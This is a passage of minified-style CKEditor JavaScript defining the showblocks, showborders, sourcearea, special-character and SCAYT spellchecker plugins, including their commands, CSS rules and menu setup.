            this.toggleState(), this.refresh(e);
        },
        refresh: function(e) {
            if (e.document) {
                var t = this.state != CKEDITOR.TRISTATE_ON || e.elementMode == CKEDITOR.ELEMENT_MODE_INLINE && !e.focusManager.hasFocus ? "removeClass" : "attachClass";
                e.editable()[t]("cke_show_blocks");
            }
        }
    }, CKEDITOR.plugins.add("showblocks", {
        onLoad: function() {
            var e, t, n, i, o, a, r = "p div pre address blockquote h1 h2 h3 h4 h5 h6".split(" "), s = CKEDITOR.getUrl(this.path), l = !(CKEDITOR.env.ie && CKEDITOR.env.version < 9), c = l ? ":not([contenteditable=false]):not(.cke_show_blocks_off)" : "";
            for (e = t = n = i = ""; o = r.pop(); ) e += ".cke_show_blocks " + o + c + (a = r.length ? "," : ""),
            n += ".cke_show_blocks.cke_contents_ltr " + o + c + a, i += ".cke_show_blocks.cke_contents_rtl " + o + c + a,
            t += ".cke_show_blocks " + o + c + "{background-image:url(" + CKEDITOR.getUrl(s + "images/block_" + o + ".png") + ")}";
            CKEDITOR.addCss((e + "{background-repeat:no-repeat;border:1px dotted gray;padding-top:8px}").concat(t, n + "{background-position:top left;padding-left:8px}", i + "{background-position:top right;padding-right:8px}")),
            l || CKEDITOR.addCss(".cke_show_blocks [contenteditable=false],.cke_show_blocks .cke_show_blocks_off{border:none;padding-top:0;background-image:none}.cke_show_blocks.cke_contents_rtl [contenteditable=false],.cke_show_blocks.cke_contents_rtl .cke_show_blocks_off{padding-right:0}.cke_show_blocks.cke_contents_ltr [contenteditable=false],.cke_show_blocks.cke_contents_ltr .cke_show_blocks_off{padding-left:0}");
        },
        init: function(e) {
            function t() {
                n.refresh(e);
            }
            if (!e.blockless) {
                var n = e.addCommand("showblocks", i);
                n.canUndo = !1, e.config.startupOutlineBlocks && n.setState(CKEDITOR.TRISTATE_ON),
                e.ui.addButton && e.ui.addButton("ShowBlocks", {
                    label: e.lang.showblocks.toolbar,
                    command: "showblocks",
                    toolbar: "tools,20"
                }), e.on("mode", function() {
                    n.state != CKEDITOR.TRISTATE_DISABLED && n.refresh(e);
                }), e.elementMode == CKEDITOR.ELEMENT_MODE_INLINE && (e.on("focus", t), e.on("blur", t)),
                e.on("contentDom", function() {
                    n.state != CKEDITOR.TRISTATE_DISABLED && n.refresh(e);
                });
            }
        }
    }), n = {
        preserveState: !0,
        editorFocus: !1,
        readOnly: 1,
        exec: function(e) {
            this.toggleState(), this.refresh(e);
        },
        refresh: function(e) {
            if (e.document) {
                var t = this.state == CKEDITOR.TRISTATE_ON ? "attachClass" : "removeClass";
                e.editable()[t]("cke_show_borders");
            }
        }
    }, CKEDITOR.plugins.add("showborders", {
        modes: {
            wysiwyg: 1
        },
        onLoad: function() {
            var e;
            e = (CKEDITOR.env.ie6Compat ? [ ".%1 table.%2,", ".%1 table.%2 td, .%1 table.%2 th", "{", "border : #d3d3d3 1px dotted", "}" ] : ".%1 table.%2,;.%1 table.%2 > tr > td, .%1 table.%2 > tr > th,;.%1 table.%2 > tbody > tr > td, .%1 table.%2 > tbody > tr > th,;.%1 table.%2 > thead > tr > td, .%1 table.%2 > thead > tr > th,;.%1 table.%2 > tfoot > tr > td, .%1 table.%2 > tfoot > tr > th;{;border : #d3d3d3 1px dotted;}".split(";")).join("").replace(/%2/g, "cke_show_border").replace(/%1/g, "cke_show_borders "),
            CKEDITOR.addCss(e);
        },
        init: function(t) {
            var e = t.addCommand("showborders", n);
            (e.canUndo = !1) !== t.config.startupShowBorders && e.setState(CKEDITOR.TRISTATE_ON),
            t.on("mode", function() {
                e.state != CKEDITOR.TRISTATE_DISABLED && e.refresh(t);
            }, null, null, 100), t.on("contentDom", function() {
                e.state != CKEDITOR.TRISTATE_DISABLED && e.refresh(t);
            }), t.on("removeFormatCleanup", function(e) {
                e = e.data, t.getCommand("showborders").state == CKEDITOR.TRISTATE_ON && e.is("table") && (!e.hasAttribute("border") || parseInt(e.getAttribute("border"), 10) <= 0) && e.addClass("cke_show_border");
            });
        },
        afterInit: function(e) {
            e = (t = e.dataProcessor) && t.dataFilter;
            var t = t && t.htmlFilter;
            e && e.addRules({
                elements: {
                    table: function(e) {
                        var t = (e = e.attributes).class, n = parseInt(e.border, 10);
                        n && !(n <= 0) || t && -1 != t.indexOf("cke_show_border") || (e.class = (t || "") + " cke_show_border");
                    }
                }
            }), t && t.addRules({
                elements: {
                    table: function(e) {
                        var t = (e = e.attributes).class;
                        t && (e.class = t.replace("cke_show_border", "").replace(/\s{2}/, " ").replace(/^\s+|\s+$/, ""));
                    }
                }
            });
        }
    }), CKEDITOR.on("dialogDefinition", function(e) {
        var t = e.data.name;
        "table" != t && "tableProperties" != t || ((t = (e = e.data.definition).getContents("info").get("txtBorder")).commit = CKEDITOR.tools.override(t.commit, function(i) {
            return function(e, t) {
                i.apply(this, arguments);
                var n = parseInt(this.getValue(), 10);
                t[!n || n <= 0 ? "addClass" : "removeClass"]("cke_show_border");
            };
        }), (e = (e = e.getContents("advanced")) && e.get("advCSSClasses")) && (e.setup = CKEDITOR.tools.override(e.setup, function(e) {
            return function() {
                e.apply(this, arguments), this.setValue(this.getValue().replace(/cke_show_border/, ""));
            };
        }), e.commit = CKEDITOR.tools.override(e.commit, function(n) {
            return function(e, t) {
                n.apply(this, arguments), parseInt(t.getAttribute("border"), 10) || t.addClass("cke_show_border");
            };
        })));
    }), function() {
        CKEDITOR.plugins.add("sourcearea", {
            init: function(n) {
                function i() {
                    var e = t && this.equals(CKEDITOR.document.getActive());
                    this.hide(), this.setStyle("height", this.getParent().$.clientHeight + "px"), this.setStyle("width", this.getParent().$.clientWidth + "px"),
                    this.show(), e && this.focus();
                }
                if (n.elementMode != CKEDITOR.ELEMENT_MODE_INLINE) {
                    var e = CKEDITOR.plugins.sourcearea;
                    n.addMode("source", function(e) {
                        var t = n.ui.space("contents").getDocument().createElement("textarea");
                        t.setStyles(CKEDITOR.tools.extend({
                            width: CKEDITOR.env.ie7Compat ? "99%" : "100%",
                            height: "100%",
                            resize: "none",
                            outline: "none",
                            "text-align": "left"
                        }, CKEDITOR.tools.cssVendorPrefix("tab-size", n.config.sourceAreaTabSize || 4))),
                        t.setAttribute("dir", "ltr"), t.addClass("cke_source cke_reset cke_enable_context_menu"),
                        n.ui.space("contents").append(t), (t = n.editable(new o(n, t))).setData(n.getData(1)),
                        CKEDITOR.env.ie && (t.attachListener(n, "resize", i, t), t.attachListener(CKEDITOR.document.getWindow(), "resize", i, t),
                        CKEDITOR.tools.setTimeout(i, 0, t)), n.fire("ariaWidget", this), e();
                    }), n.addCommand("source", e.commands.source), n.ui.addButton && n.ui.addButton("Source", {
                        label: n.lang.sourcearea.toolbar,
                        command: "source",
                        toolbar: "mode,10"
                    }), n.on("mode", function() {
                        n.getCommand("source").setState("source" == n.mode ? CKEDITOR.TRISTATE_ON : CKEDITOR.TRISTATE_OFF);
                    });
                    var t = CKEDITOR.env.ie && 9 == CKEDITOR.env.version;
                }
            }
        });
        var o = CKEDITOR.tools.createClass({
            base: CKEDITOR.editable,
            proto: {
                setData: function(e) {
                    this.setValue(e), this.status = "ready", this.editor.fire("dataReady");
                },
                getData: function() {
                    return this.getValue();
                },
                insertHtml: function() {},
                insertElement: function() {},
                insertText: function() {},
                setReadOnly: function(e) {
                    this[(e ? "set" : "remove") + "Attribute"]("readOnly", "readonly");
                },
                detach: function() {
                    o.baseProto.detach.call(this), this.clearCustomData(), this.remove();
                }
            }
        });
    }(), CKEDITOR.plugins.sourcearea = {
        commands: {
            source: {
                modes: {
                    wysiwyg: 1,
                    source: 1
                },
                editorFocus: !1,
                readOnly: 1,
                exec: function(e) {
                    "wysiwyg" == e.mode && e.fire("saveSnapshot"), e.getCommand("source").setState(CKEDITOR.TRISTATE_DISABLED),
                    e.setMode("source" == e.mode ? "wysiwyg" : "source");
                },
                canUndo: !1
            }
        }
    }, CKEDITOR.plugins.add("specialchar", {
        availableLangs: {
            af: 1,
            ar: 1,
            bg: 1,
            ca: 1,
            cs: 1,
            cy: 1,
            da: 1,
            de: 1,
            el: 1,
            en: 1,
            "en-gb": 1,
            eo: 1,
            es: 1,
            et: 1,
            fa: 1,
            fi: 1,
            fr: 1,
            "fr-ca": 1,
            gl: 1,
            he: 1,
            hr: 1,
            hu: 1,
            id: 1,
            it: 1,
            ja: 1,
            km: 1,
            ku: 1,
            lt: 1,
            lv: 1,
            nb: 1,
            nl: 1,
            no: 1,
            pl: 1,
            pt: 1,
            "pt-br": 1,
            ru: 1,
            si: 1,
            sk: 1,
            sl: 1,
            sq: 1,
            sv: 1,
            th: 1,
            tr: 1,
            tt: 1,
            ug: 1,
            uk: 1,
            vi: 1,
            zh: 1,
            "zh-cn": 1
        },
        requires: "dialog",
        init: function(t) {
            var n = this;
            CKEDITOR.dialog.add("specialchar", this.path + "dialogs/specialchar.js"), t.addCommand("specialchar", {
                exec: function() {
                    var e = t.langCode;
                    e = n.availableLangs[e] ? e : n.availableLangs[e.replace(/-.*/, "")] ? e.replace(/-.*/, "") : "en",
                    CKEDITOR.scriptLoader.load(CKEDITOR.getUrl(n.path + "dialogs/lang/" + e + ".js"), function() {
                        CKEDITOR.tools.extend(t.lang.specialchar, n.langEntries[e]), t.openDialog("specialchar");
                    });
                },
                modes: {
                    wysiwyg: 1
                },
                canUndo: !1
            }), t.ui.addButton && t.ui.addButton("SpecialChar", {
                label: t.lang.specialchar.toolbar,
                command: "specialchar",
                toolbar: "insert,50"
            });
        }
    }), CKEDITOR.config.specialChars = "! &quot; # $ % &amp; ' ( ) * + - . / 0 1 2 3 4 5 6 7 8 9 : ; &lt; = &gt; ? @ A B C D E F G H I J K L M N O P Q R S T U V W X Y Z [ ] ^ _ ` a b c d e f g h i j k l m n o p q r s t u v w x y z { | } ~ &euro; &lsquo; &rsquo; &ldquo; &rdquo; &ndash; &mdash; &iexcl; &cent; &pound; &curren; &yen; &brvbar; &sect; &uml; &copy; &ordf; &laquo; &not; &reg; &macr; &deg; &sup2; &sup3; &acute; &micro; &para; &middot; &cedil; &sup1; &ordm; &raquo; &frac14; &frac12; &frac34; &iquest; &Agrave; &Aacute; &Acirc; &Atilde; &Auml; &Aring; &AElig; &Ccedil; &Egrave; &Eacute; &Ecirc; &Euml; &Igrave; &Iacute; &Icirc; &Iuml; &ETH; &Ntilde; &Ograve; &Oacute; &Ocirc; &Otilde; &Ouml; &times; &Oslash; &Ugrave; &Uacute; &Ucirc; &Uuml; &Yacute; &THORN; &szlig; &agrave; &aacute; &acirc; &atilde; &auml; &aring; &aelig; &ccedil; &egrave; &eacute; &ecirc; &euml; &igrave; &iacute; &icirc; &iuml; &eth; &ntilde; &ograve; &oacute; &ocirc; &otilde; &ouml; &divide; &oslash; &ugrave; &uacute; &ucirc; &uuml; &yacute; &thorn; &yuml; &OElig; &oelig; &#372; &#374 &#373 &#375; &sbquo; &#8219; &bdquo; &hellip; &trade; &#9658; &bull; &rarr; &rArr; &hArr; &diams; &asymp;".split(" "),
    CKEDITOR.plugins.add("scayt", {
        requires: "menubutton,dialog",
        tabToOpen: null,
        dialogName: "scaytDialog",
        init: function(i) {
            var o = this, t = CKEDITOR.plugins.scayt;
            this.bindEvents(i), this.parseConfig(i), this.addRule(i), CKEDITOR.dialog.add(this.dialogName, CKEDITOR.getUrl(this.path + "dialogs/options.js")),
            this.addMenuItems(i);
            var e = i.lang.scayt, n = CKEDITOR.env;
            i.ui.add("Scayt", CKEDITOR.UI_MENUBUTTON, {
                label: e.text_title,
                title: i.plugins.wsc ? i.lang.wsc.title : e.text_title,
                modes: {
                    wysiwyg: !(n.ie && (n.version < 8 || n.quirks))
                },
                toolbar: "spellchecker,20",
                refresh: function() {
                    var e = i.ui.instances.Scayt.getState();
                    i.scayt && (e = t.state[i.name] ? CKEDITOR.TRISTATE_ON : CKEDITOR.TRISTATE_OFF),
                    i.fire("scaytButtonState", e);
                },
                onRender: function() {
                    var t = this;
                    i.on("scaytButtonState", function(e) {
                        void 0 !== typeof e.data && t.setState(e.data);
                    });
                },
                onMenu: function() {
                    var e = i.scayt;
                    return i.getMenuItem("scaytToggle").label = i.lang.scayt[e && t.state[i.name] ? "btn_disable" : "btn_enable"],
                    e = {
                        scaytToggle: CKEDITOR.TRISTATE_OFF,
                        scaytOptions: e ? CKEDITOR.TRISTATE_OFF : CKEDITOR.TRISTATE_DISABLED,
                        scaytLangs: e ? CKEDITOR.TRISTATE_OFF : CKEDITOR.TRISTATE_DISABLED,
                        scaytDict: e ? CKEDITOR.TRISTATE_OFF : CKEDITOR.TRISTATE_DISABLED,
                        scaytAbout: e ? CKEDITOR.TRISTATE_OFF : CKEDITOR.TRISTATE_DISABLED,
                        WSC: i.plugins.wsc ? CKEDITOR.TRISTATE_OFF : CKEDITOR.TRISTATE_DISABLED
                    }, i.config.scayt_uiTabs[0] || delete e.scaytOptions, i.config.scayt_uiTabs[1] || delete e.scaytLangs,
                    i.config.scayt_uiTabs[2] || delete e.scaytDict, e;
                }
            }), i.contextMenu && i.addMenuItems && (i.contextMenu.addListener(function() {
                var e, t = i.scayt;
                if (t) {
                    var n = t.getSelectionNode();
                    (n = n ? n.getAttribute(t.getNodeAttribute()) : n) && (e = o.menuGenerator(i, n, o),
                    t.showBanner("." + i.contextMenu._.definition.panel.className.split(" ").join(" .")));
                }
                return e;
            }), i.contextMenu._.onHide = CKEDITOR.tools.override(i.contextMenu._.onHide, function(t) {
                return function() {
                    var e = i.scayt;
                    return e && e.hideBanner(), t.apply(this);
                };
            }));
        },
        addMenuItems: function(i) {
            var e = this, t = CKEDITOR.plugins.scayt;
            i.addMenuGroup("scaytButton");
            var n = i.config.scayt_contextMenuItemsOrder.split("|");
            if (n && n.length) for (var o = 0; o < n.length; o++) i.addMenuGroup("scayt_" + n[o], o - 10);
            n = {
                scaytToggle: {
                    label: i.lang.scayt.btn_enable,
                    group: "scaytButton",
                    onClick: function() {
                        var e = i.scayt;
                        t.state[i.name] = !t.state[i.name], !0 === t.state[i.name] ? e || t.createScayt(i) : e && t.destroy(i);
                    }
                },
                scaytAbout: {
                    label: i.lang.scayt.btn_about,
                    group: "scaytButton",
                    onClick: function() {
                        i.scayt.tabToOpen = "about", i.lockSelection(), i.openDialog(e.dialogName);
                    }
                },
                scaytOptions: {
                    label: i.lang.scayt.btn_options,
                    group: "scaytButton",
                    onClick: function() {
                        i.scayt.tabToOpen = "options", i.lockSelection(), i.openDialog(e.dialogName);
                    }
                },
                scaytLangs: {
                    label: i.lang.scayt.btn_langs,
                    group: "scaytButton",
                    onClick: function() {
                        i.scayt.tabToOpen = "langs", i.lockSelection(), i.openDialog(e.dialogName);
                    }
                },
                scaytDict: {
                    label: i.lang.scayt.btn_dictionaries,
                    group: "scaytButton",
                    onClick: function() {
                        i.scayt.tabToOpen = "dictionaries", i.lockSelection(), i.openDialog(e.dialogName);
                    }
                }
            }, i.plugins.wsc && (n.WSC = {
                label: i.lang.wsc.toolbar,
                group: "scaytButton",
                onClick: function() {
                    var e = CKEDITOR.plugins.scayt, t = i.scayt, n = i.elementMode == CKEDITOR.ELEMENT_MODE_INLINE ? i.container.getText() : i.document.getBody().getText();
                    (n = n.replace(/\s/g, "")) ? (t && e.state[i.name] && t.setMarkupPaused && t.setMarkupPaused(!0),
                    i.lockSelection(), i.execCommand("checkspell")) : alert("Nothing to check!");
                }
            }), i.addMenuItems(n);
        },
        bindEvents: function(o) {
            function e() {
                var e = o.scayt;
                e && (e.removeMarkupInSelectionNode(), e.fire("startSpellCheck"));
            }
            var n = CKEDITOR.plugins.scayt, a = o.elementMode == CKEDITOR.ELEMENT_MODE_INLINE;
            CKEDITOR.on("dialogDefinition", function(e) {
                "scaytDialog" === e.data.name && e.data.definition.dialog.on("cancel", function() {
                    return !1;
                }, this, null, -1);
            });
            var t = function() {
                o.scayt && n.destroy(o);
            }, i = function() {
                n.state[o.name] && !o.readOnly && n.createScayt(o);
            }, r = function() {
                a ? (o.on("blur", t), o.on("focus", i), o.focusManager.hasFocus && i()) : i(), function() {
                    var e = o.editable();
                    e.attachListener(e, "focus", function() {
                        var e, t, n = CKEDITOR.plugins.scayt && CKEDITOR.plugins.scayt.state[o.name] && o.scayt;
                        if ((a || n) && o._.savedSelection) {
                            n = !(n = o._.savedSelection.getSelectedElement()) && o._.savedSelection.getRanges();
                            for (var i = 0; i < n.length; i++) ((e = (t = n[i]).startContainer.getText().length) < t.startOffset || e < t.endOffset) && o.unlockSelection(!1);
                        }
                    }, this, null, -10);
                }();
            };
            o.on("contentDom", r), o.on("beforeCommandExec", function(e) {
                var t;
                e.data.name in n.options.disablingCommandExec && "wysiwyg" == o.mode ? (t = o.scayt) && (n.destroy(o),
                o.fire("scaytButtonState", CKEDITOR.TRISTATE_DISABLED)) : "bold" !== e.data.name && "italic" !== e.data.name && "underline" !== e.data.name && "strike" !== e.data.name && "subscript" !== e.data.name && "superscript" !== e.data.name || (t = o.scayt) && (t.removeMarkupInSelectionNode(),
                setTimeout(function() {
                    t.fire("startSpellCheck");
                }, 0));
            }), o.on("beforeSetMode", function(e) {
                "source" == e.data && ((e = o.scayt) && (n.destroy(o), o.fire("scaytButtonState", CKEDITOR.TRISTATE_DISABLED)),
                o.document && (o.document.getBody().removeAttribute("_jquid"), o.document.getBody().removeAttribute("dir")));
            }), o.on("afterCommandExec", function(e) {
                var t;
                "wysiwyg" != o.mode || "undo" != e.data.name && "redo" != e.data.name || (t = o.scayt) && setTimeout(function() {
                    t.fire("startSpellCheck");
                }, 250);
            }), o.on("readOnly", function(e) {
                var t;
                e && (t = o.scayt, !0 === e.editor.readOnly ? t && t.fire("removeMarkupInDocument", {}) : t ? t.fire("startSpellCheck") : "wysiwyg" == e.editor.mode && !0 === n.state[e.editor.name] && (n.createScayt(o),
                e.editor.fire("scaytButtonState", CKEDITOR.TRISTATE_ON)));
            }), o.on("beforeDestroy", t), o.on("setData", function() {
                t(), o.elementMode == CKEDITOR.ELEMENT_MODE_INLINE && r();
            }, this, null, 50), o.on("insertElement", function() {
                CKEDITOR.env.ie ? setTimeout(function() {
                    e();
                }, 50) : e();
            }, this, null, 50), o.on("insertHtml", function() {
                e();
            }, this, null, 50), o.on("insertText", function() {
                e();
            }, this, null, 50), o.on("scaytDialogShown", function(e) {
                e.data.selectPage(o.scayt.tabToOpen);
            });
        },
        parseConfig: function(e) {
            if ((i = CKEDITOR.plugins.scayt).replaceOldOptionsNames(e.config), "boolean" != typeof e.config.scayt_autoStartup && (e.config.scayt_autoStartup = !1),
            i.state[e.name] = e.config.scayt_autoStartup, e.config.scayt_contextCommands || (e.config.scayt_contextCommands = "ignore|ignoreall|add"),
            e.config.scayt_contextMenuItemsOrder || (e.config.scayt_contextMenuItemsOrder = "suggest|moresuggest|control"),
            e.config.scayt_sLang || (e.config.scayt_sLang = "en_US"), (void 0 === e.config.scayt_maxSuggestions || "number" != typeof e.config.scayt_maxSuggestions || e.config.scayt_maxSuggestions < 0) && (e.config.scayt_maxSuggestions = 5),
            void 0 !== e.config.scayt_customDictionaryIds && "string" == typeof e.config.scayt_customDictionaryIds || (e.config.scayt_customDictionaryIds = ""),
            void 0 !== e.config.scayt_userDictionaryName && "string" == typeof e.config.scayt_userDictionaryName || (e.config.scayt_userDictionaryName = null),
            "string" == typeof e.config.scayt_uiTabs && 3 === e.config.scayt_uiTabs.split(",").length) {
                var t = [], n = [];
                e.config.scayt_uiTabs = e.config.scayt_uiTabs.split(","), CKEDITOR.tools.search(e.config.scayt_uiTabs, function(e) {
                    1 === Number(e) || 0 === Number(e) ? (n.push(!0), t.push(Number(e))) : n.push(!1);
                }), e.config.scayt_uiTabs = null === CKEDITOR.tools.search(n, !1) ? t : [ 1, 1, 1 ];
            } else e.config.scayt_uiTabs = [ 1, 1, 1 ];
            if ("string" != typeof e.config.scayt_serviceProtocol && (e.config.scayt_serviceProtocol = null),
            "string" != typeof e.config.scayt_serviceHost && (e.config.scayt_serviceHost = null),
            "string" != typeof e.config.scayt_servicePort && (e.config.scayt_servicePort = null),
            "string" != typeof e.config.scayt_servicePath && (e.config.scayt_servicePath = null),
            e.config.scayt_moreSuggestions || (e.config.scayt_moreSuggestions = "on"), "string" != typeof e.config.scayt_customerId && (e.config.scayt_customerId = "1:WvF0D4-UtPqN1-43nkD4-NKvUm2-daQqk3-LmNiI-z7Ysb4-mwry24-T8YrS3-Q2tpq2"),
            "string" != typeof e.config.scayt_srcUrl && (i = -1 != (i = document.location.protocol).search(/https?:/) ? i : "http:",
            e.config.scayt_srcUrl = i + "//svc.webspellchecker.net/spellcheck31/lf/scayt3/ckscayt/ckscayt.js"),
            "boolean" != typeof CKEDITOR.config.scayt_handleCheckDirty && (CKEDITOR.config.scayt_handleCheckDirty = !0),
            "boolean" != typeof CKEDITOR.config.scayt_handleUndoRedo && (CKEDITOR.config.scayt_handleUndoRedo = !0),
            e.config.scayt_disableOptionsStorage) {
                var i = CKEDITOR.tools.isArray(e.config.scayt_disableOptionsStorage) ? e.config.scayt_disableOptionsStorage : "string" == typeof e.config.scayt_disableOptionsStorage ? [ e.config.scayt_disableOptionsStorage ] : void 0, o = "all options lang ignore-all-caps-words ignore-domain-names ignore-words-with-mixed-cases ignore-words-with-numbers".split(" "), a = [ "lang", "ignore-all-caps-words", "ignore-domain-names", "ignore-words-with-mixed-cases", "ignore-words-with-numbers" ], r = CKEDITOR.tools.search, s = CKEDITOR.tools.indexOf;
                e.config.scayt_disableOptionsStorage = function(e) {
                    for (var t = 0; t < e.length; t++) {
                        var n = e[t], i = !!r(e, "options");
                        if (!r(o, n) || i && r(a, function(e) {
                            if ("lang" === e) return !1;
                        })) return;
                        if (r(a, n) && a.splice(s(a, n), 1), "all" === n || i && r(e, "lang")) return [];
                        "options" === n && (a = [ "lang" ]);
                    }
                    return [].concat(a);
                }(i);
            }
        },
        addRule: function(i) {
            var e = (n = i.dataProcessor) && n.htmlFilter, t = i._.elementsPath && i._.elementsPath.filters, n = n && n.dataFilter, o = i.addRemoveFormatFilter;
            t && t.push(function(e) {
                var t = CKEDITOR.plugins.scayt;
                if (i.scayt && e.hasAttribute(t.options.data_attribute_name)) return !1;
            }), n && n.addRules({
                elements: {
                    span: function(e) {
                        var t = CKEDITOR.plugins.scayt;
                        return t && t.state[i.name] && e.classes && CKEDITOR.tools.search(e.classes, t.options.misspelled_word_class) && (e.classes && e.parent.type === CKEDITOR.NODE_DOCUMENT_FRAGMENT ? (delete e.attributes.style,
                        delete e.name) : delete e.classes[CKEDITOR.tools.indexOf(e.classes, t.options.misspelled_word_class)]),
                        e;
                    }
                }
            }), e && e.addRules({
                elements: {
                    span: function(e) {
                        var t = CKEDITOR.plugins.scayt;
                        return t && t.state[i.name] && e.hasClass(t.options.misspelled_word_class) && e.attributes[t.options.data_attribute_name] && (e.removeClass(t.options.misspelled_word_class),
                        delete e.attributes[t.options.data_attribute_name], delete e.name), e;
                    }
                }
            }), o && o.call(i, function(e) {
                var t = CKEDITOR.plugins.scayt, n = !0;
                return i.scayt && e.hasAttribute(t.options.data_attribute_name) && (n = !1), n;
            });
        },
        scaytMenuDefinition: function(e) {
            var t = this;
            return {
                scayt_ignore: {
                    label: (e = e.scayt).getLocal("btn_ignore"),
                    group: "scayt_control",
                    order: 1,
                    exec: function(e) {
                        e.scayt.ignoreWord();
                    }
                },
                scayt_ignoreall: {
                    label: e.getLocal("btn_ignoreAll"),
                    group: "scayt_control",
                    order: 2,
                    exec: function(e) {
                        e.scayt.ignoreAllWords();
                    }
                },
                scayt_add: {
                    label: e.getLocal("btn_addWord"),
                    group: "scayt_control",
                    order: 3,
                    exec: function(e) {
                        var t = e.scayt;
                        setTimeout(function() {
                            t.addWordToUserDictionary();
                        }, 10);
                    }
                },
                option: {
                    label: e.getLocal("btn_options"),
                    group: "scayt_control",
                    order: 4,
                    exec: function(e) {
                        e.scayt.tabToOpen = "options", e.lockSelection(), e.openDialog(t.dialogName);
                    },
                    verification: function(e) {
                        return 1 == e.config.scayt_uiTabs[0];
                    }
                },
                language: {
                    label: e.getLocal("btn_langs"),
                    group: "scayt_control",
                    order: 5,
                    exec: function(e) {
                        e.scayt.tabToOpen = "langs", e.lockSelection(), e.openDialog(t.dialogName);
                    },
                    verification: function(e) {
                        return 1 == e.config.scayt_uiTabs[1];
                    }
                },
                dictionary: {
                    label: e.getLocal("btn_dictionaries"),
                    group: "scayt_control",
                    order: 6,
                    exec: function(e) {
                        e.scayt.tabToOpen = "dictionaries", e.lockSelection(), e.openDialog(t.dialogName);
                    },
                    verification: function(e) {
                        return 1 == e.config.scayt_uiTabs[2];
                    }
                },
                about: {
                    label: e.getLocal("btn_about"),
                    group: "scayt_control",
                    order: 7,
                    exec: function(e) {
                        e.scayt.tabToOpen = "about", e.lockSelection(), e.openDialog(t.dialogName);
                    }
                }
            };
        },
        buildSuggestionMenuItems: function(e, t) {
            var n = {}, i = {}, o = e.scayt;
            if (0 < t.length && "no_any_suggestions" !== t[0]) for (var a = 0; a < t.length; a++) {
                var r = "scayt_suggest_" + CKEDITOR.plugins.scayt.suggestions[a].replace(" ", "_");
                e.addCommand(r, this.createCommand(CKEDITOR.plugins.scayt.suggestions[a])), a < e.config.scayt_maxSuggestions ? (e.addMenuItem(r, {
                    label: t[a],
                    command: r,
                    group: "scayt_suggest",
                    order: a + 1
                }), n[r] = CKEDITOR.TRISTATE_OFF) : (e.addMenuItem(r, {
                    label: t[a],
                    command: r,
                    group: "scayt_moresuggest",
                    order: a + 1
                }), i[r] = CKEDITOR.TRISTATE_OFF, "on" === e.config.scayt_moreSuggestions && (e.addMenuItem("scayt_moresuggest", {
                    label: o.getLocal("btn_moreSuggestions"),
                    group: "scayt_moresuggest",
                    order: 10,
                    getItems: function() {
                        return i;
                    }
                }), n.scayt_moresuggest = CKEDITOR.TRISTATE_OFF));
            } else n.no_scayt_suggest = CKEDITOR.TRISTATE_DISABLED, e.addCommand("no_scayt_suggest", {
                exec: function() {}
            }), e.addMenuItem("no_scayt_suggest", {
                label: o.getLocal("btn_noSuggestions") || "no_scayt_suggest",
                command: "no_scayt_suggest",
                group: "scayt_suggest",
                order: 0
            });
            return n;
        },
        menuGenerator: function(e, t) {
            var n = e.scayt, i = this.scaytMenuDefinition(e), o = {}, a = e.config.scayt_contextCommands.split("|");
            if (n.fire("getSuggestionsList", {
                lang: n.getLang(),
                word: t
            }), o = this.buildSuggestionMenuItems(e, CKEDITOR.plugins.scayt.suggestions), "off" == e.config.scayt_contextCommands) return o;
            for (var r in i) -1 == CKEDITOR.tools.indexOf(a, r.replace("scayt_", "")) && "all" != e.config.scayt_contextCommands || (o[r] = CKEDITOR.TRISTATE_OFF,
            "function" == typeof i[r].verification && !i[r].verification(e) && delete o[r],
            e.addCommand(r, {
                exec: i[r].exec
            }), e.addMenuItem(r, {
                label: e.lang.scayt[i[r].label] || i[r].label,
                command: r,
                group: i[r].group,
                order: i[r].order
            }));
            return o;
        },
        createCommand: function(t) {
            return {
                exec: function(e) {
                    e.scayt.replaceSelectionNode({
                        word: t
                    });
                }
            };
        }
    }), CKEDITOR.plugins.scayt = {
        state: {},
        suggestions: [],
        loadingHelper: {
            loadOrder: []
        },
        isLoading: !1,
        options: {
            disablingCommandExec: {
                source: !0,
                newpage: !0,
                templates: !0
            },
            data_attribute_name: "data-scayt-word",
            misspelled_word_class: "scayt-misspell-word"
        },
        backCompatibilityMap: {
            scayt_service_protocol: "scayt_serviceProtocol",
            scayt_service_host: "scayt_serviceHost",
            scayt_service_port: "scayt_servicePort",
            scayt_service_path: "scayt_servicePath",
            scayt_customerid: "scayt_customerId"
        },
        replaceOldOptionsNames: function(e) {
            for (var t in e) t in this.backCompatibilityMap && (e[this.backCompatibilityMap[t]] = e[t],
            delete e[t]);
        },
        createScayt: function(e) {
            var n = this;
            this.loadScaytLibrary(e, function(e) {
                var t = {
                    lang: e.config.scayt_sLang,
                    container: "BODY" == e.editable().$.nodeName ? e.document.getWindow().$.frameElement : e.editable().$,
                    customDictionary: e.config.scayt_customDictionaryIds,
                    userDictionaryName: e.config.scayt_userDictionaryName,
                    localization: e.langCode,
                    customer_id: e.config.scayt_customerId,
                    debug: e.config.scayt_debug,
                    data_attribute_name: n.options.data_attribute_name,
                    misspelled_word_class: n.options.misspelled_word_class,
                    "options-to-restore": e.config.scayt_disableOptionsStorage,
                    focused: e.editable().hasFocus,
                    ignoreElementsRegex: e.config.scayt_elementsToIgnore
                };
                e.config.scayt_serviceProtocol && (t.service_protocol = e.config.scayt_serviceProtocol),
                e.config.scayt_serviceHost && (t.service_host = e.config.scayt_serviceHost), e.config.scayt_servicePort && (t.service_port = e.config.scayt_servicePort),
                e.config.scayt_servicePath && (t.service_path = e.config.scayt_servicePath), (t = new SCAYT.CKSCAYT(t, function() {}, function() {})).subscribe("suggestionListSend", function(e) {
                    for (var t = {}, n = [], i = 0; i < e.suggestionList.length; i++) t["word_" + e.suggestionList[i]] || (t["word_" + e.suggestionList[i]] = e.suggestionList[i],
                    n.push(e.suggestionList[i]));
                    CKEDITOR.plugins.scayt.suggestions = n;
                }), e.scayt = t, e.fire("scaytButtonState", e.readOnly ? CKEDITOR.TRISTATE_DISABLED : CKEDITOR.TRISTATE_ON);
            });
        },
        destroy: function(e) {
            e.scayt && e.scayt.destroy(), delete e.scayt, e.fire("scaytButtonState", CKEDITOR.TRISTATE_OFF);
        },
        loadScaytLibrary: function(e, t) {
            var n = this;
            void 0 === window.SCAYT || "function" != typeof window.SCAYT.CKSCAYT ? (this.loadingHelper[e.name] = t,
            this.loadingHelper.loadOrder.push(e.name), CKEDITOR.scriptLoader.load(e.config.scayt_srcUrl, function() {
                var e;
                CKEDITOR.fireOnce("scaytReady");
